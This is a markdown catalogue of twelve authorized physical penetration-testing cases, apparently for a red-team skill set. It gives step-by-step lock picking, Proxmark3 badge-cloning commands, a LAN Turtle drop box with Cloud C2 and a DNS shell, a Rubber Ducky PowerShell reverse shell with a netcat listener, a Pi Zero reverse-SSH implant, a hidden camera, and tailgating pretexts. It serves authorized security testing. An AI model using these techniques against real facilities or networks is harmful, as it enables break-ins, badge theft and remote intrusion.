# Physical Security Testing Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All test cases assume a signed engagement contract, ROE, and authorization letter. Physical security testing without explicit written authorization is a felony.

---

## Statistics

| Category | Count | Severity Range |
|----------|-------|----------------|
| A. Legal & Scope | 1 | HIGH |
| B. Lock Bypass | 1 | MEDIUM |
| C. Badge Cloning (LF) | 2 | MEDIUM - HIGH |
| D. Badge Cloning (HF) | 2 | HIGH |
| E. Drop Boxes | 1 | HIGH |
| F. USB Weapons | 1 | HIGH |
| G. Network Implant Concealment | 1 | MEDIUM |
| H. Hidden Cameras | 1 | MEDIUM |
| I. On-Site Recon | 1 | MEDIUM |
| J. Social Engineering (Physical) | 1 | MEDIUM |
| K. Exit & Evidence | 1 | HIGH |
| **Total** | **12** | **MEDIUM - HIGH** |

---

## A. Legal & Scope

### TC-PS-001: Legal Scope & Authorization Pre-Flight

| Field | Value |
|------|-------|
| **ID** | TC-PS-001 |
| **Name** | Legal Scope & Authorization Pre-Flight |
| **Severity** | HIGH |
| **Category** | Legal & Scope |
| **Objective** | Verify that the engagement has a signed contract, ROE, and authorization letter before any operational activity. |
| **Prerequisites** | Client identified; engagement dates proposed; TrustedSec `physical-docs` templates cloned. |
| **Test Steps** | 1. `git clone https://github.com/trustedsec/physical-docs.git`<br>2. Customize `engagement-contract.md`, `rules-of-engagement.md`, `authorization-letter.md` for this engagement<br>3. Verify client legal signs the contract<br>4. Verify authorization letter is on client letterhead, signed by an officer<br>5. Verify 24/7 client contact phone is reachable (test call)<br>6. Verify local law for lock pick possession (e.g., California Penal Code 466)<br>7. Verify insurance coverage (consultancy E&O + client general liability)<br>8. Brief operators; every operator carries a copy of the authorization letter |
| **Expected Results** | Signed contract; ROE documents prohibited actions and abort criteria; authorization letter printed on client letterhead with 24/7 contact; local law verified; insurance confirmed; operators briefed. |
| **False Positive Risk** | LOW — control validation. The failure mode is operating without one of these documents, which is a felony risk. |
| **Cleanup** | N/A. |
| **References** | `payloads.md` §1; TrustedSec `physical-docs`; `guides/physical-security-testing-playbook.md` §2 (Pre-Flight) |
| **Related Tools** | physical-docs templates, legal counsel, client officer signature |

---

## B. Lock Bypass

### TC-PS-002: Pin-Tumbler Lock Picking

| Field | Value |
|------|-------|
| **ID** | TC-PS-002 |
| **Name** | Pin-Tumbler Lock Picking (Commercial Kwikset / Schlage) |
| **Severity** | MEDIUM |
| **Category** | Lock Bypass |
| **Objective** | Open a commercial pin-tumbler lock using single-pin picking or raking, leaving no forensic evidence distinguishable from normal wear. |
| **Prerequisites** | Signed engagement with lock picking in scope; lock pick set (tension wrench + hook + rake); operator trained on at least green-belt locks. |
| **Test Steps** | 1. Verify lock picking is in scope (ROE review)<br>2. Identify the lock type (pin-tumbler, dimple, tubular, wafer)<br>3. Approach the door outside camera coverage if possible<br>4. Apply light clockwise tension with tension wrench at bottom of keyway<br>5. Insert hook or rake at back of keyway<br>6. Single-pin pick: lift each pin sequentially; listen / feel for clicks<br>7. Rake: scrub the rake in and out with bouncing motion<br>8. When all pins at shear line, core rotates fully; lock opens<br>9. Document time-to-open, technique used, and any tool marks<br>10. Re-lock the door from inside if possible; otherwise pick closed behind you |
| **Expected Results** | Lock opens in 10-60 seconds for commercial pin-tumbler; longer for security pins; no distinguishable tool marks. Document the entry for the engagement timeline. |
| **False Positive Risk** | MEDIUM — pick-resistant locks (Medeco, Assa, Mul-T-Lock) take longer or fail; bump-resistant pins defeat bumping; raking fails on security pins. Test recon before committing to picking. |
| **Cleanup** | Re-lock the door; pick closed behind you if necessary; document any tool marks. |
| **References** | `payloads.md` §2 (Lock Picking — Pin-Tumbler); `guides/physical-security-testing-playbook.md` §4 (Entry Vectors) |
| **Related Tools** | Lock pick set (Peterson / SouthOrd / Sparrows), bump keys, transparent practice locks |

---

## C. Badge Cloning (LF)

### TC-PS-003: RFID 125 kHz HID Prox Clone

| Field | Value |
|------|-------|
| **ID** | TC-PS-003 |
| **Name** | RFID 125 kHz HID Prox Clone (Proxmark3 / ESP-RFID-Tool) |
| **Severity** | MEDIUM |
| **Category** | Badge Cloning (LF) |
| **Objective** | Clone an HID Prox (125 kHz) badge to a writable T5577 card and verify the clone opens the door. |
| **Prerequisites** | TC-PS-001 (legal scope); Proxmark3 or ESP-RFID-Tool; writable T5577 cards; original HID Prox badge (borrowed or sniffed); badge cloning in scope. |
| **Test Steps** | 1. Power on Proxmark3, connect via USB, launch `pm3`<br>2. `lf search` — auto-detect 125 kHz tag in the field; expect HID Prox identified<br>3. `lf hid read` — read facility code and card number<br>4. `lf hid save my_hid.dic` — save to dictionary<br>5. Place writable T5577 on the antenna<br>6. `lf hid clone --fc <FC> --cn <CN>` — write to T5577<br>7. Verify the clone: `lf search` on the T5577 should match the original<br>8. Walk to the door, tap the cloned T5577; reader LED should turn green<br>9. Document the entry timestamp<br>10. Alternative: `lf hid sim --fc <FC> --cn <CN>` to simulate from Proxmark3 antenna |
| **Expected Results** | T5577 clone opens the door; reader logs show a valid badge tap; original badge holder is unaware. Document time-to-clone (<30 seconds with practice). |
| **False Positive Risk** | LOW — HID Prox has no authentication; if the technology is HID Prox, cloning always succeeds. The risk is misidentifying the technology (some readers look like HID Prox but use Indala or AWID). |
| **Cleanup** | Return the original badge if borrowed; securely destroy the T5577 at engagement end; document destruction in chain-of-custody. |
| **References** | `payloads.md` §5.1 (Proxmark3 LF), §5.2 (ESP-RFID-Tool); `guides/physical-security-testing-playbook.md` §5 (On-Site Ops) |
| **Related Tools** | Proxmark3, ESP-RFID-Tool, Flipper Zero, T5577 writable cards |

### TC-PS-004: Defensive Badge Audit (LF Cloning Susceptibility)

| Field | Value |
|------|-------|
| **ID** | TC-PS-004 |
| **Name** | Defensive Badge Audit — LF Cloning Susceptibility |
| **Severity** | HIGH |
| **Category** | Badge Cloning (LF) |
| **Objective** | When hired by the facility, audit the deployed badge system for cloning susceptibility and report upgrade paths. |
| **Prerequisites** | Defensive engagement signed; walk-through with client facility manager; Proxmark3; sample badge of each deployed technology. |
| **Test Steps** | 1. Walk the facility with the client; document reader vendors at each door<br>2. For each deployed LF technology, attempt to clone a sample badge:<br>   - `pm3 > lf search`<br>   - `pm3 > lf hid read` (HID Prox)<br>   - `pm3 > lf indala read` (Indala)<br>   - `pm3 > lf awid read` (AWID)<br>3. Document time-to-clone and required equipment for each<br>4. Test the cloned badge at a non-production reader (with client supervision)<br>5. Document reader logs (does the system detect the duplicate tap?)<br>6. Run a duplicate-tap report in the access control system<br>7. Run a DFO/DHO alarm test; verify guard response SLA<br>8. Produce a badge audit report with recommendations |
| **Expected Results** | Each LF technology (HID Prox, Indala, AWID) is trivially clonable in <30 seconds. Report recommends migration to 13.56 MHz mutual-authentication credentials (HID iCLASS SEOS, Mifare DESFire EV3). |
| **False Positive Risk** | LOW — defensive audit. The risk is over-stating susceptibility; some facilities have compensating controls (anti-passback, biometric layering, guard response) that mitigate cloning risk. Document these in the report. |
| **Cleanup** | N/A. |
| **References** | `payloads.md` §14.1 (Defensive Badge Audit), §14.3 (Anti-cloning controls); `guides/physical-security-testing-playbook.md` §7 (Defense) |
| **Related Tools** | Proxmark3, access control system log review, client facility walkthrough |

---

## D. Badge Cloning (HF)

### TC-PS-005: Mifare Classic 1K Clone (CRYPTO1)

| Field | Value |
|------|-------|
| **ID** | TC-PS-005 |
| **Name** | Mifare Classic 1K Clone via CRYPTO1 Weakness |
| **Severity** | HIGH |
| **Category** | Badge Cloning (HF) |
| **Objective** | Clone a Mifare Classic card via the broken CRYPTO1 cipher using Proxmark3 autopwn or ACR122U + mfoc. |
| **Prerequisites** | TC-PS-001 (legal scope); Proxmark3 or ACR122U + laptop; magic UID-writable Mifare Classic cards; original Mifare Classic card. |
| **Test Steps** | 1. `pm3 > hf search` — identify Mifare Classic 1K (ATQA 00 04, SAK 01)<br>2. `pm3 > hf mf autopwn` — recover all sector keys via default keys + nested + hardnested<br>3. Verify all 16 sector keys recovered<br>4. `pm3 > hf mf dump` — dump all sectors to `hf-mf-<UID>-dump.bin`<br>5. Place a magic UID-writable Mifare card on the antenna<br>6. `pm3 > hf mf cload --source hf-mf-<UID>-dump.bin` — write the dump to the magic card<br>7. Verify by reading back: `pm3 > hf mf read --blk 0 -k FFFFFFFFFFFF`<br>8. Test at the door; reader should accept the clone<br>9. Alternative: ACR122U + `mfoc -O original.mfd -k <default keys>` then `nfc-mfclassic W a original.mfd`<br>10. Document time-to-clone (typically <5 minutes) |
| **Expected Results** | All sector keys recovered; dump contains all 1KB of card data including UID; magic card clone opens the door. Document for the engagement report. |
| **False Positive Risk** | LOW — CRYPTO1 is broken; if the technology is Mifare Classic, autopwn always recovers keys. Risk is misidentifying Mifare Classic as DESFire (DESFire is not vulnerable). |
| **Cleanup** | Return original card if borrowed; securely destroy the magic card at engagement end; document destruction. |
| **References** | `payloads.md` §6.1 (Mifare Classic via Proxmark3), §6.2 (ACR122U + mfoc); `guides/physical-security-testing-playbook.md` §5 |
| **Related Tools** | Proxmark3, ACR122U, mfoc, mfcuk, magic UID-writable Mifare cards |

### TC-PS-006: HID iCLASS Decode and Clone (Legacy)

| Field | Value |
|------|-------|
| **ID** | TC-PS-006 |
| **Name** | HID iCLASS Decode and Clone (Legacy Keys) |
| **Severity** | HIGH |
| **Category** | Badge Cloning (HF) |
| **Objective** | Decode an HID iCLASS legacy credential using leaked standard keys and clone it to a writable iCLASS card. |
| **Prerequisites** | TC-PS-001 (legal scope); Proxmark3 with iCLASS dictionary; original HID iCLASS card; writable iCLASS clone card. |
| **Test Steps** | 1. `pm3 > hf search` — identify HID iCLASS (ISO15693)<br>2. Capture the CSN (card serial number)<br>3. `pm3 > hf iclass read --csn <csn> --key <standard_legacy_key>` — read with leaked standard key<br>4. Verify the read succeeded (some iCLASS deployments use custom keys; report if read fails)<br>5. Place a writable iCLASS clone card on the antenna<br>6. `pm3 > hf iclass clone --csn <csn>` — write<br>7. Test at the door<br>8. For iCLASS SE / SEOS deployments, document that cloning requires system keys; report as "low cloning risk" |
| **Expected Results** | HID iCLASS Legacy: clone succeeds in <30 minutes. iCLASS SE / SEOS: cloning is materially harder (mutual auth); report as low cloning risk and recommend SEOS for new deployments. |
| **False Positive Risk** | MEDIUM — iCLASS deployment mix (Legacy vs SE vs SEOS) varies by door. Test each reader separately; don't assume based on the reader model alone. |
| **Cleanup** | Return original card if borrowed; securely destroy the clone at engagement end; document destruction. |
| **References** | `payloads.md` §6.4 (HID iCLASS); `guides/physical-security-testing-playbook.md` §5 |
| **Related Tools** | Proxmark3, iCLASS clone cards, leaked standard key dictionary |

---

## E. Drop Boxes

### TC-PS-007: LAN Turtle Drop Box Deployment

| Field | Value |
|------|-------|
| **ID** | TC-PS-007 |
| **Name** | LAN Turtle Drop Box Deployment with Cloud C2 |
| **Severity** | HIGH |
| **Category** | Drop Boxes |
| **Objective** | Pre-configure a LAN Turtle for persistent network access, deploy it at the target facility, and verify Cloud C2 check-in. |
| **Prerequisites** | TC-PS-001 (legal scope, drop-box deployment explicitly authorized); Hak5 LAN Turtle; Hak5 Cloud C2 community edition account; pre-engagement configuration complete. |
| **Test Steps** | 1. Pre-engagement: SSH to Turtle (`ssh root@<turtle_ip>`, default password `sh3llz`); change password<br>2. Configure SSH key-only auth<br>3. Configure Cloud C2: `CONFIG SYSTEM C2 ADD URL=<claim_url>`<br>4. Install payloads: AUTOSHARK (continuous tcpdump), DNSCAT2 (DNS-tunneled shell), URLS (SSH pivot)<br>5. Verify Cloud C2 dashboard shows the device online<br>6. At the engagement site, locate an unused USB port on an always-on workstation or USB wall charger with network jack<br>7. Plug in the Turtle<br>8. Wait 30 seconds; verify Cloud C2 check-in (dashboard shows online)<br>9. From Cloud C2, SSH into the Turtle; verify network access (e.g., `tcpdump -i eth0`, scan the internal network)<br>10. Document deployment location and time for the engagement timeline<br>11. At engagement end: Cloud C2 DEVICE > RETIRE; physically retrieve the Turtle; document retrieval |
| **Expected Results** | Turtle checks in within 30 seconds; Cloud C2 dashboard shows online; operator can SSH in and pivot to the internal network; tcpdump captures internal traffic. |
| **False Positive Risk** | MEDIUM — Turtle requires either USB power + USB-Ethernet, or a network jack that's actually live. Verify the jack is live before deploying (some jacks are dark). 802.1X port authentication blocks the Turtle. |
| **Cleanup** | Reverse the deployment; retire the device in Cloud C2; physically retrieve; securely wipe if needed. |
| **References** | `payloads.md` §7.1 (LAN Turtle); `guides/physical-security-testing-playbook.md` §5 |
| **Related Tools** | Hak5 LAN Turtle, Hak5 Cloud C2 |

---

## F. USB Weapons

### TC-PS-008: USB Rubber Ducky Payload Delivery

| Field | Value |
|------|-------|
| **ID** | TC-PS-008 |
| **Name** | USB Rubber Ducky Reverse Shell Payload |
| **Severity** | HIGH |
| **Category** | USB Weapons |
| **Objective** | Encode a DuckyScript reverse shell payload, deploy via USB Rubber Ducky to an unattended workstation, and verify C2 connection. |
| **Prerequisites** | TC-PS-001 (legal scope, USB weapon delivery explicitly authorized); USB Rubber Ducky; microSD card; C2 listener (e.g., Netcat); target workstation identified during recon. |
| **Test Steps** | 1. Write DuckyScript payload (PowerShell reverse shell via `GUI r`, `STRING powershell -WindowStyle Hidden -Exec Bypass`, etc.)<br>2. Encode: `java -jar duckencode.jar -i payload.txt -o inject.bin`<br>3. Copy inject.bin to microSD: `sudo dd if=inject.bin of=/dev/sdX bs=1M`<br>4. Insert microSD into the Rubber Ducky<br>5. Start the C2 listener: `nc -lvnp 4444`<br>6. At the target workstation (after-hours, unattended), plug in the Ducky<br>7. Wait for LED to indicate payload completion (~5-10 seconds)<br>8. Verify C2 receives the reverse shell<br>9. Document time-of-insertion, payload-completion, shell-establishment, USB-removal<br>10. At engagement end: clear logs only with client authorization; document the workstation asset tag |
| **Expected Results** | Ducky injects keystrokes within 5-10 seconds; C2 receives PowerShell reverse shell; operator can pivot. Document for the engagement report. |
| **False Positive Risk** | MEDIUM — endpoint protection (USB device whitelisting, Group Policy HID blocking, EDR) may block or alert on the Ducky. Verify endpoint posture in recon. Workstation must be unlocked or the payload must include a lock-screen bypass. |
| **Cleanup** | Remove the Ducky; clear C2 session; clear logs only with authorization; document any artifacts left (e.g., PowerShell event logs). |
| **References** | `payloads.md` §8.1 (Rubber Ducky), §8.2 (Common payloads); `guides/physical-security-testing-playbook.md` §5 |
| **Related Tools** | USB Rubber Ducky, duckencode, Netcat listener, C2 infrastructure |

---

## G. Network Implant Concealment

### TC-PS-009: Pi Zero W Implant with Reverse SSH Tunnel

| Field | Value |
|------|-------|
| **ID** | TC-PS-009 |
| **Name** | Raspberry Pi Zero W Network Implant with Reverse SSH Tunnel |
| **Severity** | MEDIUM |
| **Category** | Network Implant Concealment |
| **Objective** | Build a Pi Zero W implant, configure a reverse SSH tunnel via autossh, conceal it on-site, and verify remote access. |
| **Prerequisites** | TC-PS-001 (legal scope, network implant explicitly authorized); Pi Zero W; consultancy C2 server; microSD card; battery pack; concealment case. |
| **Test Steps** | 1. Flash Raspberry Pi OS Lite to microSD; pre-configure SSH and WiFi<br>2. First boot on consultancy WiFi; SSH in<br>3. Generate a restricted SSH key on the C2 server (permitopen only)<br>4. Install autossh on the Pi: `sudo apt install -y autossh`<br>5. Create `/etc/systemd/system/reverse-tunnel.service` with autossh reverse SSH to C2<br>6. Enable and start the service<br>7. Test from C2: `ssh -p 2222 pi@localhost` — should land on the Pi<br>8. Conceal the Pi (wall plate, surge protector, behind server rack)<br>9. At the engagement site, power on; verify it connects to target WiFi and tunnel establishes<br>10. SSH in from C2; verify network access; pivot to internal targets<br>11. Document deployment location and time<br>12. At engagement end: stop the service, power off, retrieve, securely wipe the SD card |
| **Expected Results** | Pi boots, connects to target WiFi, reverse SSH tunnel establishes to C2; operator can SSH in and pivot. Document for the engagement report. |
| **False Positive Risk** | MEDIUM — WiFi may not extend to concealment location (Pi Zero W range is ~20m); battery life limits runtime to 8-12 hours; network anomaly detection may flag the new MAC. |
| **Cleanup** | Stop the reverse tunnel; power off; retrieve; securely wipe the SD card (`shred -uvz /dev/mmcblk0`) or physically destroy. |
| **References** | `payloads.md` §7.3 (Pi Zero W DIY implant), §9 (Concealment); `guides/physical-security-testing-playbook.md` §5 |
| **Related Tools** | Raspberry Pi Zero W, autossh, microSD, battery, concealment case |

---

## H. Hidden Cameras

### TC-PS-010: Pi Zero W Hidden Camera Deployment

| Field | Value |
|------|-------|
| **ID** | TC-PS-010 |
| **Name** | Pi Zero W Hidden Camera for Situational Awareness |
| **Severity** | MEDIUM |
| **Category** | Hidden Cameras |
| **Objective** | Build a Pi Zero W camera, deploy it concealed at a choke point, and verify image capture for the duration of the engagement. |
| **Prerequisites** | TC-PS-001 (legal scope, hidden camera explicitly authorized, audio consent law verified); Pi Zero W; Pi Camera V2; battery pack; concealment; cellular or WiFi uplink. |
| **Test Steps** | 1. Build the Pi Zero W camera: `sudo apt install fswebcam`<br>2. Write `/home/pi/capture.sh` to capture a JPEG every 60 seconds<br>3. Auto-start via crontab `@reboot /home/pi/capture.sh &`<br>4. Pre-engagement soak test (24 hours): verify battery life, image quality, off-site upload<br>5. On-site: place at a choke point (break room, elevator lobby, hallway corner)<br>6. Conceal: in a plant, on a bookshelf, behind a clock<br>7. Verify image upload to cloud bucket<br>8. Operator reviews feed every 30 minutes for guard rounds<br>9. Document placement (photo) for retrieval<br>10. At engagement end: retrieve, securely wipe SD card, document |
| **Expected Results** | Camera captures every 60 seconds; off-site upload succeeds; operator has situational awareness of guard rounds for the engagement duration. No faces of uninvolved employees in the final deliverable (blur or crop). |
| **False Positive Risk** | MEDIUM — battery life limits runtime to ~8 hours; WiFi range limits placement; cellular uplink adds a visible signature; RF sweeps may detect the camera. |
| **Cleanup** | Retrieve; securely wipe SD card; document destruction in chain-of-custody; blur faces in deliverable. |
| **References** | `payloads.md` §10.1 (Pi Zero W camera), §10.3 (Audio consent law); `guides/physical-security-testing-playbook.md` §5 |
| **Related Tools** | Raspberry Pi Zero W, Pi Camera V2, fswebcam, battery, cellular modem |

---

## I. On-Site Recon

### TC-PS-011: Pre-Engagement Building Recon

| Field | Value |
|------|-------|
| **ID** | TC-PS-011 |
| **Name** | Pre-Engagement Building Recon Pack |
| **Severity** | MEDIUM |
| **Category** | On-Site Recon |
| **Objective** | Produce a recon pack with building layout, badge vendor, camera coverage, and guard cadence before any active operation. |
| **Prerequisites** | TC-PS-001 (legal scope); public property access; OSINT tools (LinkedIn, Google Maps, county records). |
| **Test Steps** | 1. Satellite and Street View imagery: identify entrances, loading dock, parking<br>2. LinkedIn OSINT: search for `<client>` employees with badge photos visible<br>3. Job postings: search for `<client> security` postings; identify access control vendor<br>4. Walk-by recon (ON PUBLIC PROPERTY — never enter without authorization) at 8am, noon, 5pm, 10pm<br>5. Log reader vendor (visual confirmation), badge design, camera coverage, guard shift change, tailgating behavior<br>6. Public records: county/city building permits for `<client> security install`<br>7. Produce recon pack (markdown) with building layout, inferred badge vendor, camera coverage, guard cadence, recommended entry vector<br>8. Sketch a building map (entry points, camera FOV, badge readers, guard stations, patrol routes) |
| **Expected Results** | Recon pack complete; badge vendor inferred with at least 2 sources of evidence; camera blind spots identified; guard cadence documented; recommended entry vector selected. |
| **False Positive Risk** | MEDIUM — recon is only as good as the observation window. Single walk-by misses shift variations; satellite imagery ages; badge vendor may differ from reader vendor. Verify on-site. |
| **Cleanup** | N/A. Recon is passive. |
| **References** | `payloads.md` §11 (On-Site Engagement Ops); `guides/physical-security-testing-playbook.md` §3 (Phase 2 Recon) |
| **Related Tools** | Google Maps / Street View, LinkedIn, county records, walk-by observation, sketchpad |

---

## J. Social Engineering (Physical)

### TC-PS-012: Tailgating Pretext Preparation

| Field | Value |
|------|-------|
| **ID** | TC-PS-012 |
| **Name** | Tailgating Pretext Preparation and Rehearsal |
| **Severity** | MEDIUM |
| **Category** | Social Engineering (Physical) |
| **Objective** | Prepare a pretext that matches recon observations, rehearse with the engagement team, and define abort criteria. |
| **Prerequisites** | TC-PS-001 (legal scope, social engineering explicitly authorized); TC-PS-011 (recon pack complete); operator team. |
| **Test Steps** | 1. Choose a pretext matching recon (HVAC contractor if HVAC vans observed; delivery driver if Amazon observed; forgot badge if tailgating observed)<br>2. Match pretext to recon observations (HVAC vans at loading dock → HVAC pretext)<br>3. Wardrobe: match client dress code; carry clipboard with fake work order or tool bag<br>4. NO visible lock picks, exposed Proxmark3, or cameras on operator's person<br>5. Write a 15-second greeting script (natural, not over-rehearsed)<br>6. Define graceful exit if challenged ("Oh, I'll just go check in at reception")<br>7. Define abort criteria (guard draws → stop, produce authorization letter, call client)<br>8. Rehearse with a teammate roleplay<br>9. Operator carries authorization letter, hidden; produced only if challenged by security<br>10. Document the chosen pretext, script, abort criteria in the engagement plan |
| **Expected Results** | Pretext selected with recon-based justification; script rehearsed; abort criteria documented; wardrobe matches client; authorization letter carried. |
| **False Positive Risk** | MEDIUM — pretext that doesn't match recon (e.g., delivery driver when no deliveries observed) raises suspicion. Mismatched wardrobe (suit for a casual office) raises suspicion. Test recon-based pretext selection. |
| **Cleanup** | N/A. Tailgating leaves no artifact. |
| **References** | `payloads.md` §12 (Social Engineering for Physical); `guides/physical-security-testing-playbook.md` §4 (Entry Vectors) |
| **Related Tools** | Recon pack, wardrobe matching client dress code, clipboard, fake work order, body camera (if consent) |

---

## Summary Table

| TC ID | Name | Category | Severity |
|-------|------|----------|----------|
| TC-PS-001 | Legal Scope & Authorization Pre-Flight | Legal & Scope | HIGH |
| TC-PS-002 | Pin-Tumbler Lock Picking | Lock Bypass | MEDIUM |
| TC-PS-003 | RFID 125 kHz HID Prox Clone | Badge Cloning (LF) | MEDIUM |
| TC-PS-004 | Defensive Badge Audit (LF) | Badge Cloning (LF) | HIGH |
| TC-PS-005 | Mifare Classic 1K Clone (CRYPTO1) | Badge Cloning (HF) | HIGH |
| TC-PS-006 | HID iCLASS Decode and Clone | Badge Cloning (HF) | HIGH |
| TC-PS-007 | LAN Turtle Drop Box Deployment | Drop Boxes | HIGH |
| TC-PS-008 | USB Rubber Ducky Payload Delivery | USB Weapons | HIGH |
| TC-PS-009 | Pi Zero W Network Implant | Network Implant | MEDIUM |
| TC-PS-010 | Pi Zero W Hidden Camera | Hidden Cameras | MEDIUM |
| TC-PS-011 | Pre-Engagement Building Recon | On-Site Recon | MEDIUM |
| TC-PS-012 | Tailgating Pretext Preparation | Social Engineering | MEDIUM |

---

## Severity Definitions

| Severity | Meaning | Action |
|----------|---------|--------|
| **HIGH** | Engagement-critical or felony-risk activity | Document exhaustively; require lead operator sign-off; produce authorization letter on demand |
| **MEDIUM** | Standard operational activity | Document; team lead reviews |
| **LOW** | Recon or defensive activity | Document |

---

## Cross-Reference to Adjacent Skills

| This skill's test case | Adjacent skill's related test case |
|------------------------|-----------------------------------|
| TC-PS-003 (HID Prox clone) | `bluetooth-rfid-nfc` — protocol-level analysis of 125 kHz |
| TC-PS-005 (Mifare Classic clone) | `bluetooth-rfid-nfc` — CRYPTO1 weakness internals |
| TC-PS-007 (LAN Turtle) | `post-exploitation` — internal pivoting after deployment |
| TC-PS-008 (USB Rubber Ducky) | `av-edr-evasion` — bypassing endpoint protection |
| TC-PS-009 (Pi Zero W implant) | `anti-forensics` — minimizing footprint |
| TC-PS-011 (Building recon) | `osint` — LinkedIn / public records enumeration |
| TC-PS-012 (Tailgating pretext) | `social-engineering` — phishing / vishing pretexts |
